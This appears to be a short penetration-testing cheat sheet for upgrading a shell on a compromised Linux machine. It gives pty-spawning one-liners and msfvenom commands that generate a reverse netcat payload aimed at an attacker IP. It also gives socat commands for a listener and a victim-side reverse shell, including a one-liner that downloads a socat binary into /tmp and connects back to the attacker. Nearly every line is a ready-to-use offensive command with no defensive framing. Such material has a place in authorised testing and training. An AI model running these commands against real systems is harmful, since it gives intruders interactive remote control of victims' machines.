## Linux Bash Commands

```
# Change user
su username

```

### Improving your Shell
```
# Python
python -c 'import pty; pty.spawn("/bin/sh")'

# Perl
perl —e 'exec "/bin/sh";'
```

### Improving your Shell with msfvenom one-liners
```
# List the options
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'

# Select and use one
msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.3.4 LPORT=4444 R
```

### Using socat to invoke full interactive shell
```
# On attacking machine, listen with socat
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On victim machine with socat already installed, replace 10.0.3.4 with attacking ip
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

# On victim machine without socat installed
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

```
